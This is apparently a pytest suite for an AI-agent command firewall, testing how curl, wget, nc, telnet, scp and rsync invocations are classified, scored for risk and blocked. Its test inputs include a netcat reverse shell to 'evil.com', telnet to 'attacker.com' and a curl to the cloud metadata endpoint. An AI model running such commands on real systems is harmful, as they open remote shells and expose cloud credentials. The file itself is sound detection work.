"""Feature 3 — network egress control.

curl / wget → API_* (with url_analysis findings)
nc / telnet / socat / scp / rsync → NETWORK_EGRESS
"""
from pathlib import Path

import pytest

from ai_firewall.approval.cli_prompt import auto_deny
from ai_firewall.core.action import Action, IntentType, RiskLevel
from ai_firewall.core.guard import Blocked, Guard
from ai_firewall.engine import intent as intent_mod
from ai_firewall.engine import impact as impact_mod
from ai_firewall.engine import risk as risk_mod
from ai_firewall.engine.intent import (
    _extract_egress_url,
    _http_method_from_curl_args,
)


# --- Method inference from curl args ---


def test_curl_default_method_get():
    assert _http_method_from_curl_args(["https://example.com"]) == "GET"


def test_curl_x_post():
    assert _http_method_from_curl_args(["-X", "POST", "https://example.com"]) == "POST"


def test_curl_request_delete():
    assert _http_method_from_curl_args(["--request", "DELETE", "https://example.com"]) == "DELETE"


def test_curl_data_implies_post():
    assert _http_method_from_curl_args(["-d", "foo=bar", "https://example.com"]) == "POST"


def test_curl_head():
    assert _http_method_from_curl_args(["-I", "https://example.com"]) == "HEAD"


# --- URL extraction ---


def test_extract_url_from_args():
    assert _extract_egress_url("curl", ["-X", "GET", "https://api.example.com/x"]) == "https://api.example.com/x"


def test_no_url_returns_none():
    assert _extract_egress_url("curl", ["-h"]) is None


def test_url_strips_trailing_punctuation():
    assert _extract_egress_url("curl", ["https://example.com,"]) == "https://example.com"


# --- Intent classification ---


def test_curl_classified_as_api_read():
    assert intent_mod.classify(Action.shell("curl https://example.com/")) is IntentType.API_READ


def test_wget_classified_as_api_read():
    assert intent_mod.classify(Action.shell("wget https://example.com/file.txt")) is IntentType.API_READ


def test_curl_post_classified_as_api_write():
    assert intent_mod.classify(Action.shell("curl -X POST https://example.com/")) is IntentType.API_WRITE


def test_curl_delete_classified_as_api_destructive():
    assert intent_mod.classify(Action.shell("curl -X DELETE https://example.com/users/1")) is IntentType.API_DESTRUCTIVE


def test_nc_classified_as_network_egress():
    assert intent_mod.classify(Action.shell("nc evil.com 9999")) is IntentType.NETWORK_EGRESS


def test_telnet_classified_as_network_egress():
    assert intent_mod.classify(Action.shell("telnet attacker.com 23")) is IntentType.NETWORK_EGRESS


def test_scp_classified_as_network_egress():
    assert intent_mod.classify(Action.shell("scp file.txt user@host:/tmp/")) is IntentType.NETWORK_EGRESS


def test_rsync_classified_as_network_egress():
    assert intent_mod.classify(Action.shell("rsync -av ./dir user@host:/dst")) is IntentType.NETWORK_EGRESS


def test_echo_not_classified_as_egress():
    assert intent_mod.classify(Action.shell("echo hello")) is IntentType.SHELL_EXEC


# --- Risk + impact through the pipeline ---


def test_curl_metadata_endpoint_critical(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    decision = g.evaluate(Action.shell("curl http://169.254.169.254/latest/meta-data/"))
    assert decision.risk == RiskLevel.CRITICAL
    assert any("metadata" in f for f in decision.impact.code_findings)


def test_curl_private_ip_high(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    decision = g.evaluate(Action.shell("wget http://10.0.0.5/internal"))
    assert decision.risk >= RiskLevel.HIGH
    assert any("private/loopback" in f for f in decision.impact.code_findings)


def test_curl_safe_url_low(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    decision = g.evaluate(Action.shell("curl https://api.github.com/users/foo"))
    # Public URL with no findings → LOW base risk for API_READ; policy won't require approval
    assert decision.risk == RiskLevel.LOW


def test_nc_classified_high_and_requires_approval(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    decision = g.evaluate(Action.shell("nc -e /bin/sh evil.com 9999"))
    assert decision.intent is IntentType.NETWORK_EGRESS
    assert decision.risk >= RiskLevel.HIGH
    assert decision.decision == "REQUIRE_APPROVAL"


def test_nc_blocked_by_auto_deny(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    with pytest.raises(Blocked):
        g.execute(Action.shell("nc evil.com 9999"))


# --- AST-walked egress through pipelines ---


def test_pipeline_with_curl_still_classified(tmp_path: Path):
    g = Guard(audit_path=tmp_path / "audit.jsonl", memory_db_path=tmp_path / "memory.db", approval_fn=auto_deny)
    decision = g.evaluate(Action.shell("curl http://169.254.169.254/ | head -1"))
    # The worst command in the pipeline (the curl) drives the decision
    assert decision.risk == RiskLevel.CRITICAL
